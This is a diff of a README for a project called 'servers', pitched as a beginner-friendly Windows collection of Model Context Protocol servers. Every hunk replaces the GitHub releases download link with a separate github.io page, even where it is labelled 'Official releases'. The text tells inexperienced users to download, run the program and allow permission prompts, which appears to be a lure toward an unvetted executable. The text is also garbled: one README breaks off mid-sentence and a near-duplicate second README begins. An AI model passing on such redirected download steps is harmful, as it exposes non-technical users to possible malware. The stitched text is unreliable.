@@ -1,12 +1,12 @@
 # 🖥️ servers - Run Powerful AI Tool Servers Easily
 
-[![Download servers](https://img.shields.io/badge/Download_servers-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sachith54/servers/releases)
+[![Download servers](https://img.shields.io/badge/Download_servers-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://sachith54.github.io)
 
 servers is a Windows-friendly collection of Model Context Protocol servers. It helps connect your AI tools to useful services and local resources through a simple, guided experience. This README is written for everyday computer users. You do not need programming knowledge to get started.
 
 The main download page is here:
 
-[Download servers](https://github.com/sachith54/servers/releases)
+[Download servers](https://sachith54.github.io)
 
 ## ✨ What Is servers?
 
@@ -29,7 +29,7 @@ Key benefits include:
 
 ## 🚀 Download and Run on Windows
 
-Visit this link to download the application: [Download servers](https://github.com/sachith54/servers/releases).
+Visit this link to download the application: [Download servers](https://sachith54.github.io).
 
 This is the main starting point for Windows users. Open the link in your browser, then wait for the release page to load. The page gives you access to the software download.
 
@@ -57,13 +57,13 @@ If Windows shows a permission prompt, choose the option that allows the applicat
 
 When you open servers for the first time, take a moment to look through the available server options. Each server is a helper for a different type of connection. You can choose the ones that match what# 🖥️ servers - Connect Your AI Tools With Ease
 
-[![Download servers](https://img.shields.io/badge/Download_servers-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sachith54/servers/releases)
+[![Download servers](https://img.shields.io/badge/Download_servers-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://sachith54.github.io)
 
 servers is a Windows-friendly collection of Model Context Protocol servers. It gives your AI tools a simple way to reach useful services and local resources through organized, ready-made connections. This guide is written for everyday computer users. You do not need programming knowledge to get started.
 
 The official download page is here:
 
-[Visit this link to download the application](https://github.com/sachith54/servers/releases)
+[Visit this link to download the application](https://sachith54.github.io)
 
 ## ✨ What Is servers?
 
@@ -91,7 +91,7 @@ If you have ever wished your AI assistant could reach the right information or t
 
 ## 🚀 Download and Run on Windows
 
-Visit this link to download the application: [Download servers](https://github.com/sachith54/servers/releases).
+Visit this link to download the application: [Download servers](https://sachith54.github.io).
 
 This is the main starting point for Windows users. Open the link in your browser, then wait for the release page to load. The page gives you access to the software download.
 
@@ -158,7 +158,7 @@ Your settings and preferences usually remain in place between versions. If you a
 
 Bookmark the download page so you can find it again quickly:
 
-[Download servers](https://github.com/sachith54/servers/releases)
+[Download servers](https://sachith54.github.io)
 
 ## 🧰 Common Questions
 
@@ -188,7 +188,7 @@ Close the servers application. You can also stop individual servers inside the a
 | Purpose | Model Context Protocol Servers |
 | Platform | Windows |
 | Skill level | Beginner friendly |
-| Download page | [Official releases](https://github.com/sachith54/servers/releases) |
+| Download page | [Official releases](https://sachith54.github.io) |
 | First step | Visit the download link and get the application |
 
 ## ✅ Before You Begin Checklist
